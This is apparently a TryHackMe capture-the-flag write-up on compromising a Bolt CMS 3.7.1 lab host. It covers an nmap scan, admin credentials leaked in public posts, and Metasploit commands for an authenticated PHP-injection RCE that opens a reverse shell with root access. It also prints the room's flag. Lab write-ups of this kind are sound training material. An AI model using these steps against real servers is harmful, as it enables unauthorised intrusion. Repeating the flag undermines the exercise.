# Bolt CTF Writeup

## Target Information
- **IP Address**: 10.48.149.11
- **Goal**: Retrieve the `flag.txt` file.

---

## 1. Information Gathering

### Service Scanning
An initial Nmap scan was performed to identify open ports and services:
```bash
nmap -sV 10.48.149.11
```
**Results**:
- **Port 22**: SSH (OpenSSH 7.6p1)
- **Port 80**: HTTP (Apache 2.4.29)
- **Port 8000**: HTTP (Bolt CMS, PHP 7.2.32-1)

---

## 2. Enumeration & Initial Access

### Web Enumeration (Port 8000)
The web application on port 8000 was identified as Bolt CMS. Exploring the public posts revealed critical information:
- **"Message for IT Department"**: The admin explicitly leaked the password: `boltadmin123`.
- **"Message From Admin"**: The admin's name is **Jake** and the username is `bolt`.

### Initial Access
Using the discovered credentials (`bolt:boltadmin123`), a successful login was performed at the Bolt CMS dashboard located at `/bolt/login`.

---

## 3. Vulnerability Assessment

### Version Identification
Upon logging into the administrative dashboard, the Bolt CMS version was identified as **3.7.1**.

### Vulnerability Research
Research into vulnerabilities for Bolt CMS 3.7.1 (and earlier versions like 3.7.0) revealed a significant **Authenticated Remote Code Execution (RCE)** flaw. This vulnerability allows an attacker with administrative access to inject PHP code into the user profile's `displayname` field and subsequently trigger its execution via a file rename vulnerability involving cached session files.

---

## 4. Exploitation

The Metasploit framework's `exploit/unix/webapp/bolt_authenticated_rce` module was selected to automate the exploitation process.

### Execution Steps:
1.  **Select Module**: `use exploit/unix/webapp/bolt_authenticated_rce`
2.  **Set Target Details**:
    - `set RHOSTS 10.48.149.11`
    - `set RPORT 8000`
3.  **Provide Credentials**:
    - `set USERNAME bolt`
    - `set PASSWORD boltadmin123`
4.  **Configure Listener**:
    - `set LHOST <Your_tun0_IP>`
5.  **Launch Exploit**: `exploit`

The module successfully authenticated, performed the PHP injection through the profile update, and established a stable reverse shell session.

---

## 5. Flag Retrieval

After gaining access to the underlying Linux system, the shell was confirmed to have **root** privileges. A search for the target file was conducted:
```bash
find /home -name 'flag.txt'
```
**File Location**: `/home/flag.txt`

**Flag**: `THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}`

---

## 6. Conclusion
The compromise of the Bolt server was made possible by a combination of insecure administrative practices (leaking credentials in public content) and the use of a CMS version vulnerable to a known RCE exploit. Remediation involves removing sensitive information from public posts and upgrading the CMS to a secure, patched version.